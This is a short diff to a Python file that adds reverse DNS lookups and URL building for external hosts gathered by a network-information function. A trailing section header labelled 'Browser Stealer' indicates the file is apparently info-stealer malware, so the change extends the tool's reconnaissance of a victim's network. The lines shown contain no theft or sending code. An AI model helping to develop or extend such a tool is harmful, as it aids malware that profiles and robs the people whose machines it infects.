@@ -842,6 +842,27 @@ def _network_info():
         ext_by_ip[ip]["all_ports"].append({"port": h["port"], "service": h["service"]})
     info["external_hosts"] = list(ext_by_ip.values())
 
+    # ── Reverse DNS lookup for external hosts ──
+    old_timeout = socket.getdefaulttimeout()
+    socket.setdefaulttimeout(2)  # 2s timeout per lookup
+    for h in info["external_hosts"]:
+        try:
+            hostname = socket.gethostbyaddr(h["ip"])[0]
+            h["hostname"] = hostname
+            # Build URL for HTTP/HTTPS connections
+            has_https = any(p["port"] == 443 for p in h.get("all_ports", []))
+            has_http = any(p["port"] == 80 or p["port"] == 8080 for p in h.get("all_ports", []))
+            if has_https:
+                h["url"] = f"https://{hostname}"
+            elif has_http:
+                h["url"] = f"http://{hostname}"
+            else:
+                h["url"] = hostname
+        except:
+            # Reverse DNS failed — keep IP only
+            pass
+    socket.setdefaulttimeout(old_timeout)
+
     return info
 
 # ── Browser Stealer ──────────────────────────────────────────────────
